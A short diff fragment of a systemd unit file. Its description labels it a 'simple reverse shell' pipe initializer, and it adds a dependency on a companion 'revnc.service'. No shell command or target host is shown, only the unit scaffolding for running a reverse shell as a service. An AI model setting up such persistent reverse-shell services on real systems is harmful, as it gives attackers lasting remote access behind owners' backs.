@@ -1,6 +1,7 @@
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
 [Unit]
 Description=A simple reverse shell - initializing the pipe
+Requires=revnc.service
 
 [Service]
 Type=oneshot
